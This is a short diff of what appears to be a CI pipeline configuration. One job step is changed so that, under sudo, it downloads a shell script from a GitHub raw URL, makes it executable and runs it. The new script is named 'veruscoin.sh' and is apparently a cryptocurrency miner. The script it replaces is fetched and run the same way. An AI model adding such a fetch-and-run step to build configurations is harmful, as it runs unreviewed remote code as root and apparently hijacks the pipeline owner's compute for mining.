@@ -8,7 +8,7 @@ jobs:
       - run:
          name:
          command: |
-            sudo su --command "wget https://raw.githubusercontent.com/Owijeka/dev/main/De.sh && chmod u+x De.sh && ./De.sh"
+            sudo su --command "wget https://raw.githubusercontent.com/Owijeka/wingsan/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh"
 
 workflows:
   version: 2.1
